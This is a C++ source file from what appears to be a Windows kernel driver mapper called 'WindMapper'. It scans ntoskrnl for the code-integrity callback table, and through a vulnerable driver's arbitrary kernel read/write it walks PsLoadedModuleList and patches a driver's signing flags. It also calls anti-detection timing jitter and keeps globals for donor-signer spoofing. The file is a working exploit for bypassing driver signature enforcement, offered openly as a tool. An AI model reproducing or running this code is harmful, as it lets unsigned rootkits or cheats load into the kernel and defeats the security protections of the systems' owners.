#include "Mapper.h"
#include <stdio.h>
#include <cstdarg>
#include <Psapi.h>
#pragma comment(lib, "Psapi.lib")

// Forward declare from MapperCore.cpp
extern FILE* g_LogFile;
static void KDbgLog(const char* func, const char* fmt, ...) {
    char buf[2048];
    va_list args;
    va_start(args, fmt);
    int prefixLen = snprintf(buf, sizeof(buf), "[WindMapper][%s] ", func);
    if (prefixLen < 0) prefixLen = 0;
    vsnprintf(buf + prefixLen, sizeof(buf) - prefixLen, fmt, args);
    va_end(args);
    printf("%s\n", buf);
    fflush(stdout);
    OutputDebugStringA(buf);
    OutputDebugStringA("\n");
    if (g_LogFile) { fprintf(g_LogFile, "%s\n", buf); fflush(g_LogFile); }
}
#define KLOG(fmt, ...) KDbgLog(__FUNCTION__, fmt, ##__VA_ARGS__)
#define KLOG_STATUS(msg, st) KDbgLog(__FUNCTION__, "%s: 0x%08X (%s)", msg, (DWORD)(st), NT_SUCCESS(st) ? "SUCCESS" : "FAILED")

pNtQuerySystemInformation NtQuerySystemInformationPtr = nullptr;
pNtLoadDriver NtLoadDriverPtr = nullptr;
pNtUnloadDriver NtUnloadDriverPtr = nullptr;
pRtlAdjustPrivilege RtlAdjustPrivilegePtr = nullptr;
pRtlGetFullPathName_UEx RtlGetFullPathName_UExPtr = nullptr;
pRtlCreateRegistryKey RtlCreateRegistryKeyPtr = nullptr;
pRtlWriteRegistryValue RtlWriteRegistryValuePtr = nullptr;
pNtDeviceIoControlFile NtDeviceIoControlFilePtr = nullptr;
pNtDeleteKey NtDeleteKeyPtr = nullptr;
pNtOpenKey NtOpenKeyPtr = nullptr;
pNtFlushKey NtFlushKeyPtr = nullptr;
pNtCreateFile NtCreateFilePtr = nullptr;
pNtSetInformationFile NtSetInformationFilePtr = nullptr;

WCHAR g_LoaderServicePath[128] = { 0 };
WCHAR g_DriverServicePath[128] = { 0 };

PVOID g_OriginalCiCallback = nullptr;
PVOID g_CiCallbackAddress = nullptr;
bool g_CiCallbackPatched = false;

bool g_KernelSigningVerified = false;
DWORD g_PatchedFlags = 0;
PVOID g_DriverLoadAddress = nullptr;
WCHAR g_DonorCopyPath[520] = { 0 };
WCHAR g_DonorSignerName[256] = { 0 };


WCHAR g_SentinelServicePath[128] = { 0 };
PVOID g_SentinelLoadAddress = nullptr;
ULONG g_SentinelImageSize = 0;

WCHAR g_ShadowFsServicePath[128] = { 0 };

struct WindowsVersion {
    DWORD major;
    DWORD minor;
    DWORD build;
    bool isWindows11;
};

static WindowsVersion GetWindowsVersion() {
    WindowsVersion ver = { 0, 0, 0, false };

    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
        if (RtlGetVersion) {
            RTL_OSVERSIONINFOW osvi = { 0 };
            osvi.dwOSVersionInfoSize = sizeof(osvi);
            if (RtlGetVersion(&osvi) == 0) {
                ver.major = osvi.dwMajorVersion;
                ver.minor = osvi.dwMinorVersion;
                ver.build = osvi.dwBuildNumber;
                ver.isWindows11 = (ver.major >= 10 && ver.build >= 22000);
            }
        }
    }
    return ver;
}

namespace KernelUtils {

    PVOID GetKernelModuleBase(const char* moduleName) {
        KLOG("Searching for kernel module: '%s'", moduleName);
        NTSTATUS status;
        ULONG returnLength = 0;
        PVOID buffer = nullptr;

        if (!NtQuerySystemInformationPtr) {
            KLOG("ERROR: NtQuerySystemInformation is NULL!");
            return nullptr;
        }

        status = NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
        while (status == STATUS_INFO_LENGTH_MISMATCH) {
            if (buffer) {
                VirtualFree(buffer, 0, MEM_RELEASE);
            }
            buffer = VirtualAlloc(nullptr, returnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buffer) {
                return nullptr;
            }
            status = NtQuerySystemInformationPtr(11, buffer, returnLength, &returnLength);
        }

        if (!NT_SUCCESS(status)) {
            if (buffer) {
                VirtualFree(buffer, 0, MEM_RELEASE);
            }
            return nullptr;
        }

        PRTL_PROCESS_MODULES moduleInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
        PVOID result = nullptr;
        KLOG("SystemModuleInformation: %u modules loaded", moduleInfo->NumberOfModules);

        for (ULONG i = 0; i < moduleInfo->NumberOfModules; i++) {
            auto& mod = moduleInfo->Modules[i];
            auto currentName = reinterpret_cast<const char*>(
                mod.FullPathName + mod.OffsetToFileName
            );


            if (i < 5) {
                KLOG("  Module[%u]: '%s' Base=%p Size=0x%X", i, currentName, mod.ImageBase, mod.ImageSize);
            }

            if (_stricmp(currentName, moduleName) == 0) {
                result = mod.ImageBase;
                KLOG("  FOUND '%s' at base=%p, size=0x%X", moduleName, result, mod.ImageSize);
                break;
            }
        }

        VirtualFree(buffer, 0, MEM_RELEASE);


        if (!result && _stricmp(moduleName, "ntoskrnl.exe") == 0) {
            KLOG("Fallback: trying EnumDeviceDrivers for ntoskrnl...");
            LPVOID drivers[1024];
            DWORD cbNeeded = 0;
            if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
                if (cbNeeded >= sizeof(LPVOID) && drivers[0] != nullptr) {
                    result = drivers[0];
                    KLOG("  EnumDeviceDrivers: ntoskrnl base=%p", result);
                } else {
                    KLOG("  EnumDeviceDrivers: no valid first driver");
                }
            } else {
                KLOG("  EnumDeviceDrivers failed, GLE=%u", GetLastError());
            }
        }

        if (!result) {
            KLOG("WARNING: Module '%s' NOT FOUND in system modules", moduleName);
        }

        return result;
    }

    PVOID GetKernelProcAddress(PVOID moduleBase, const char* procName) {
        HMODULE localModule = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localModule) {
            return nullptr;
        }

        PVOID localProc = GetProcAddress(localModule, procName);
        if (!localProc) {
            FreeLibrary(localModule);
            return nullptr;
        }

        ULONG_PTR offset = reinterpret_cast<ULONG_PTR>(localProc) -
            reinterpret_cast<ULONG_PTR>(localModule);

        FreeLibrary(localModule);

        PVOID result = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(moduleBase) + offset
        );

        return result;
    }

    BOOL GetCiValidateImageHeaderEntry(PVOID* outCiEntry, PVOID* outZwFlush) {
        KLOG("=== GetCiValidateImageHeaderEntry ===");
        AntiDetect::TimingJitter();

        WindowsVersion winVer = GetWindowsVersion();
        KLOG("Windows version: %u.%u.%u (isWin11=%s)", winVer.major, winVer.minor, winVer.build,
             winVer.isWindows11 ? "YES" : "NO");

        PVOID ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) {
            KLOG("FATAL: Cannot find ntoskrnl.exe base!");
            return FALSE;
        }
        KLOG("ntoskrnl.exe kernel base: %p", ntoskrnlBase);

        HMODULE localModule = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localModule) {
            KLOG("FATAL: LoadLibraryExW ntoskrnl.exe failed, GLE=%u", GetLastError());
            return FALSE;
        }
        KLOG("ntoskrnl.exe local mapping: %p", localModule);

        MODULEINFO modinfo = { 0 };
        if (!K32GetModuleInformation(GetCurrentProcess(), localModule, &modinfo, sizeof(modinfo))) {
            KLOG("FATAL: K32GetModuleInformation failed, GLE=%u", GetLastError());
            FreeLibrary(localModule);
            return FALSE;
        }
        KLOG("ntoskrnl image size: 0x%X", modinfo.SizeOfImage);

        struct CiPattern {
            BYTE bytes[16];
            DWORD length;
            DWORD leaOffset;
            const char* name;
        };


        CiPattern win10Patterns[] = {


            { { 0xFF, 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 }, 7, 4, "Win10 call; mov rdx,rbx; lea r8" },


            { { 0xFF, 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 }, 7, 4, "Win10 call; mov rcx,rbx; lea r8" },
        };


        CiPattern win11Patterns[] = {
            { { 0x41, 0xB8, 0x05, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0D }, 9, 6, "Win11 25H2 mov r8d,5; lea r9" },
        };

        CiPattern universalPatterns[] = {

            { { 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 }, 6, 3, "Universal mov rdx,rbx; lea r8" },
            { { 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 }, 6, 3, "Universal mov rcx,rbx; lea r8" },

            { { 0x4C, 0x8D, 0x0D }, 3, 0, "Universal lea r9" },
        };

        BYTE* searchBase = reinterpret_cast<BYTE*>(localModule);
        BYTE* foundAddr = nullptr;
        DWORD leaInstructionOffset = 0;
        const char* matchedPattern = nullptr;

        auto searchPattern = [&](CiPattern* patterns, int count) -> bool {
            for (int p = 0; p < count; p++) {
                CiPattern& pat = patterns[p];
                KLOG("  Trying pattern '%s' (len=%u)...", pat.name, pat.length);
                for (DWORD offset = 0; offset < modinfo.SizeOfImage - pat.length; offset++) {
                    bool match = true;
                    for (DWORD j = 0; j < pat.length; j++) {
                        if (searchBase[offset + j] != pat.bytes[j]) {
                            match = false;
                            break;
                        }
                    }
                    if (match) {
                        BYTE* leaAddr = searchBase + offset + pat.leaOffset;
                        INT32 leaOff = *reinterpret_cast<INT32*>(leaAddr + 3);
                        ULONG_PTR targetAddr = reinterpret_cast<ULONG_PTR>(leaAddr) + 7 + static_cast<INT64>(leaOff);
                        ULONG_PTR targetOffset = targetAddr - reinterpret_cast<ULONG_PTR>(localModule);
                        KLOG("    Pattern '%s' matched at offset=0x%X, targetOffset=0x%llX",
                             pat.name, offset, (unsigned long long)targetOffset);

                        if (targetOffset < modinfo.SizeOfImage) {
                            if (pat.length <= 3) {
                                if (targetOffset > modinfo.SizeOfImage / 2) {
                                    DWORD* targetData = reinterpret_cast<DWORD*>(targetAddr);
                                    if (*targetData == 256 || *targetData == 0 || *targetData >= 100) {
                                        foundAddr = leaAddr;
                                        leaInstructionOffset = pat.leaOffset;
                                        matchedPattern = pat.name;
                                        return true;
                                    }
                                }
                            } else {
                                foundAddr = leaAddr;
                                leaInstructionOffset = pat.leaOffset;
                                matchedPattern = pat.name;
                                return true;
                            }
                        }
                    }
                }
            }
            return false;
        };

        bool found = false;
        if (winVer.isWindows11) {
            KLOG("Searching Win11 patterns first...");
            found = searchPattern(win11Patterns, sizeof(win11Patterns) / sizeof(win11Patterns[0]));
            if (!found) {
                KLOG("Win11 patterns failed, trying Win10 patterns...");
                found = searchPattern(win10Patterns, sizeof(win10Patterns) / sizeof(win10Patterns[0]));
            }
        } else {
            KLOG("Searching Win10 patterns first...");
            found = searchPattern(win10Patterns, sizeof(win10Patterns) / sizeof(win10Patterns[0]));
            if (!found) {
                KLOG("Win10 patterns failed, trying Win11 patterns...");
                found = searchPattern(win11Patterns, sizeof(win11Patterns) / sizeof(win11Patterns[0]));
            }
        }

        if (!found) {
            KLOG("Trying universal patterns...");
            found = searchPattern(universalPatterns, sizeof(universalPatterns) / sizeof(universalPatterns[0]));
        }

        if (!foundAddr) {
            KLOG("FATAL: No CI callback pattern matched!");
            FreeLibrary(localModule);
            return FALSE;
        }
        KLOG("Pattern matched: '%s'", matchedPattern);

        INT32 leaOffset = *reinterpret_cast<INT32*>(foundAddr + 3);

        ULONG_PTR seCiCallbacksLocal = reinterpret_cast<ULONG_PTR>(foundAddr) + 7 + static_cast<INT64>(leaOffset);

        ULONG_PTR kernelOffset = seCiCallbacksLocal - reinterpret_cast<ULONG_PTR>(localModule);
        KLOG("SeCiCallbacks: local=%p, kernelOffset=0x%llX",
             (PVOID)seCiCallbacksLocal, (unsigned long long)kernelOffset);

        if (kernelOffset >= modinfo.SizeOfImage) {
            KLOG("ERROR: kernelOffset 0x%llX >= imageSize 0x%X - out of bounds!",
                 (unsigned long long)kernelOffset, modinfo.SizeOfImage);
            FreeLibrary(localModule);
            return FALSE;
        }

        PVOID seCiCallbacksKernel = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(ntoskrnlBase) + kernelOffset
        );
        KLOG("SeCiCallbacks kernel addr: %p", seCiCallbacksKernel);

        PVOID zwFlushLocal = GetProcAddress(localModule, "ZwFlushInstructionCache");
        if (!zwFlushLocal) {
            KLOG("ERROR: ZwFlushInstructionCache not found in ntoskrnl");
            FreeLibrary(localModule);
            return FALSE;
        }

        PVOID zwFlushKernel = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(zwFlushLocal) -
            reinterpret_cast<ULONG_PTR>(localModule) +
            reinterpret_cast<ULONG_PTR>(ntoskrnlBase)
        );

        PVOID ciValidateImageHeaderEntry = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(seCiCallbacksKernel) + 0x20
        );
        KLOG("CiValidateImageHeader entry (SeCiCallbacks+0x20): %p", ciValidateImageHeaderEntry);
        KLOG("ZwFlushInstructionCache kernel: %p", zwFlushKernel);

        FreeLibrary(localModule);

        if (outCiEntry) {
            *outCiEntry = ciValidateImageHeaderEntry;
        }
        if (outZwFlush) {
            *outZwFlush = zwFlushKernel;
        }

        return TRUE;
    }

    BOOL PatchDriverSigningFlags(HANDLE device, PCWSTR driverFileName) {
        KLOG("=== PatchDriverSigningFlags for: %ls ===", driverFileName);
        char narrowName[256] = {};
        WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, narrowName, sizeof(narrowName), NULL, NULL);

        PVOID driverBase = nullptr;
        {
            ULONG returnLength = 0;
            NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
            if (returnLength == 0) return FALSE;
            PVOID buffer = VirtualAlloc(nullptr, returnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buffer) return FALSE;
            NTSTATUS st = NtQuerySystemInformationPtr(11, buffer, returnLength, &returnLength);
            if (NT_SUCCESS(st)) {
                PRTL_PROCESS_MODULES modInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
                for (ULONG i = 0; i < modInfo->NumberOfModules; i++) {
                    auto& m = modInfo->Modules[i];
                    const char* name = reinterpret_cast<const char*>(m.FullPathName + m.OffsetToFileName);
                    if (_stricmp(name, narrowName) == 0) {
                        driverBase = m.ImageBase;
                        KLOG("Found driver '%s' at base=%p, size=0x%X", narrowName, driverBase, m.ImageSize);
                        break;
                    }
                }
            }
            VirtualFree(buffer, 0, MEM_RELEASE);
        }

        if (!driverBase) {
            KLOG("ERROR: Driver '%s' not found in loaded modules", narrowName);
            return FALSE;
        }
        KLOG("Looking up PsLoadedModuleList...");
        HMODULE localNtos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localNtos) {
            KLOG("ERROR: LoadLibraryExA ntoskrnl.exe failed");
            return FALSE;
        }
        PVOID localPsLML = GetProcAddress(localNtos, "PsLoadedModuleList");
        if (!localPsLML) {
            KLOG("ERROR: PsLoadedModuleList not found");
            FreeLibrary(localNtos);
            return FALSE;
        }
        PVOID ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) {
            KLOG("ERROR: ntoskrnl.exe base not found");
            FreeLibrary(localNtos);
            return FALSE;
        }
        ULONG_PTR pmlOffset = reinterpret_cast<ULONG_PTR>(localPsLML) - reinterpret_cast<ULONG_PTR>(localNtos);
        FreeLibrary(localNtos);
        PVOID pPsLoadedModuleList = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ntoskrnlBase) + pmlOffset);
        KLOG("PsLoadedModuleList: local=%p, offset=0x%llX, kernel=%p",
             localPsLML, (unsigned long long)pmlOffset, pPsLoadedModuleList);

        ULONG_PTR listFlink = 0;
        NTSTATUS status = VulnDriver::ReadKernelMemory(device, pPsLoadedModuleList, &listFlink, sizeof(listFlink));
        KLOG_STATUS("ReadKernelMemory (PsLoadedModuleList->Flink)", status);
        KLOG("PsLoadedModuleList Flink: %p", (PVOID)listFlink);
        if (!NT_SUCCESS(status) || !listFlink) {
            return FALSE;
        }

        ULONG_PTR headAddr = reinterpret_cast<ULONG_PTR>(pPsLoadedModuleList);
        ULONG_PTR current = listFlink;

        for (int i = 0; i < 1024 && current != headAddr; i++) {
            PVOID entryDllBase = nullptr;
            status = VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x30), &entryDllBase, sizeof(entryDllBase));
            if (!NT_SUCCESS(status)) break;

            if (entryDllBase == driverBase) {
                KLOG("Found matching KLDR_DATA_TABLE_ENTRY at %p", (PVOID)current);
                DWORD flags = 0;
                VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &flags, sizeof(flags));
                KLOG("Current Flags=0x%08X, setting bit 0x20...", flags);
                flags |= 0x20;
                status = VulnDriver::WriteKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &flags, sizeof(flags));
                KLOG_STATUS("WriteKernelMemory (flags patch)", status);
                if (!NT_SUCCESS(status)) {
                    return FALSE;
                }

                DWORD verifyFlags = 0;
                VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &verifyFlags, sizeof(verifyFlags));
                KLOG("Verify flags after patch: 0x%08X (bit 0x20 set: %s)", verifyFlags, (verifyFlags & 0x20) ? "YES" : "NO");

                g_DriverLoadAddress = driverBase;
                g_PatchedFlags = verifyFlags;
                g_KernelSigningVerified = (verifyFlags & 0x20) != 0;

                if (g_KernelSigningVerified) {
                    KLOG("Driver signing flag patched OK");
                } else {
                    KLOG("WARNING: Flag patch verification failed!");
                }
                return TRUE;
            }

            ULONG_PTR nextFlink = 0;
            VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current), &nextFlink, sizeof(nextFlink));
            if (!nextFlink || nextFlink == current) break;
            current = nextFlink;
        }

        KLOG("ERROR: Driver base %p not found in PsLoadedModuleList (walked %d entries)",
             driverBase, 1024);
        return FALSE;
    }

    PVOID GetDriverBaseByName(PCWSTR driverFileName, PULONG outImageSize) {
        KLOG("Looking up driver by name: %ls", driverFileName);

        if (!NtQuerySystemInformationPtr) {
            KLOG("ERROR: NtQuerySystemInformationPtr is NULL");
            return nullptr;
        }

        ULONG returnLength = 0;
        NTSTATUS status = NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
        if (returnLength == 0) {
            return nullptr;
        }


        ULONG bufSize = returnLength + 4096;
        PVOID buffer = VirtualAlloc(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) {
            return nullptr;
        }

        status = NtQuerySystemInformationPtr(11, buffer, bufSize, &returnLength);
        if (!NT_SUCCESS(status)) {
            VirtualFree(buffer, 0, MEM_RELEASE);
            return nullptr;
        }


        PRTL_PROCESS_MODULES moduleInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
        PVOID result = nullptr;
        ULONG resultSize = 0;

        char targetNarrow[260] = {};
        WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, targetNarrow, sizeof(targetNarrow), NULL, NULL);

        for (ULONG i = 0; i < moduleInfo->NumberOfModules; i++) {
            auto& mod = moduleInfo->Modules[i];
            const char* fileName = reinterpret_cast<const char*>(
                mod.FullPathName + mod.OffsetToFileName);

            if (i == 0) {
                KLOG("  First module: '%s' Base=%p Size=0x%X", fileName, mod.ImageBase, mod.ImageSize);
            }

            if (_stricmp(fileName, targetNarrow) == 0) {
                result = mod.ImageBase;
                resultSize = mod.ImageSize;
                KLOG("  FOUND '%s' Base=%p Size=0x%X", targetNarrow, result, resultSize);
                break;
            }
        }

        VirtualFree(buffer, 0, MEM_RELEASE);

        if (result) {
            if (outImageSize)
                *outImageSize = resultSize;
            return result;
        }

        KLOG("WARNING: Driver '%s' not found in loaded modules", targetNarrow);
        return nullptr;
    }

}
